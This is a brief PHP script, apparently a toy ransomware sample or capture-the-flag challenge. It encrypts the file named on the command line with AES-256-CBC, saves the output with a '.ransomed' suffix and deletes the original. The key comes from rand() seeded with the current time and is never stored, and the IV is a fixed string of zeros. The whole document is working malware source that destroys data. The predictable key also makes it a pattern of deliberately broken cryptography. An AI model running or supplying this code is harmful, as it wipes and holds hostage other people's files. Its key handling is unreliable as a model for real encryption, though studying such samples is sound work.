<?php

function encrypt($data) {
    srand(time());
    $password = '';
    for ($i = 0; $i < 32; ++$i) {
        $password .= chr(rand(48, 126));
    }
    $iv = "0000000000000000";
    return openssl_encrypt($data, 'aes-256-cbc', $password, OPENSSL_RAW_DATA, $iv);
}

$file = $argv[1];
file_put_contents($file . '.ransomed', encrypt(file_get_contents($file)));
unlink($file);